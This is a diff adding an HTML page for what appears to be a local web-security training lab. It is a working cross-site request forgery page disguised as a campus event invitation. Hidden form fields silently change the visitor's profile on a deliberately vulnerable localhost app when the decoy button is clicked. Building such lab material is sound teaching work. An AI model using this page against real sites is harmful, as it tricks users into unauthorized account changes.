@@ -1,0 +1,63 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Campus Event Invitation — Local CSRF Lab</title>
+    <style>
+      body {
+        font-family: Arial;
+        background: #f3f6fa;
+        padding: 70px;
+        max-width: 650px;
+        margin: auto;
+      }
+      .card {
+        background: white;
+        padding: 36px;
+        border-radius: 16px;
+      }
+      button {
+        background: #0da79a;
+        color: white;
+        border: 0;
+        padding: 14px;
+        border-radius: 7px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>Campus event invitation</h1>
+      <p>
+        This is a separate-origin malicious page used ONLY in a local training
+        lab. Clicking submits a profile change to the logged-in CampusConnect
+        account.
+      </p>
+      <form
+        method="POST"
+        action="http://localhost/is_webSecurity_task/vulnerable/profile_update.php"
+      >
+        <input
+          type="hidden"
+          name="full_name"
+          value="Changed by CSRF Demo"
+        /><input
+          type="hidden"
+          name="email"
+          value="csrf-demo@example.test"
+        /><input
+          type="hidden"
+          name="bio"
+          value="Profile updated through a cross-origin form in the local lab."
+        /><button type="submit">View event invitation</button>
+      </form>
+      <p>
+        <small
+          >Run on localhost:8001 and keep CampusConnect running at localhost:80.
+          The app uses no anti-CSRF tokens. Only use a disposable demo
+          account.</small
+        >
+      </p>
+    </div>
+  </body>
+</html>
